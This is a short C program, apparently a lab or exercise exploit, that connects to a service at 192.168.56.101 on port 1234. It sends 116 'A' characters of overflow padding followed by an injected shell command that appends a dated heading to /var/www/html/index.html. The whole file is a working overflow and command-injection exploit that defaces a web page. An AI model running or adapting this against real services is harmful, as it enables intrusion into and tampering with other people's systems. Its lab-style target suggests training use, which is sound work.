#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>


char IP[] = "192.168.56.101";
int PORT = 1234;
char COMMAND[] = "echo '<h2>27.07.2026</h2>' >> /var/www/html/index.html #";

void attack(void) {
    int sock_fd;
    struct sockaddr_in server_addr;
    char buffer[1024];
    ssize_t bytes_received;

    printf("Connecting to %s:%d...\n", IP, PORT);

    // TCP Socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("Socket creation failed");
        return;
    }

    // addres setup
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, IP, &server_addr.sin_addr) <= 0) {
        printf("invalid IP address\n");
        close(sock_fd);
        return;
    }

    // connection
    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        printf("Connection error\n");
        close(sock_fd);
        return;
    }

    // command 116 A's + bash script + \n
    memset(buffer, 0, sizeof(buffer));
    memset(buffer, 'A', 116);
    strcat(buffer, COMMAND);
    strcat(buffer, " \n");

    ssize_t buffer_len = strlen(buffer);
    if (send(sock_fd, buffer, buffer_len, 0) < 0) {
        printf("Send failed\n");
        close(sock_fd);
        return;
    }


    shutdown(sock_fd, SHUT_WR);

    // response from app
    memset(buffer, 0, sizeof(buffer));
    printf("Response:\n");
    while ((bytes_received = recv(sock_fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        printf("%s", buffer);
    }
    

    close(sock_fd);
}

int main(void) {
    attack();
    return 0;
}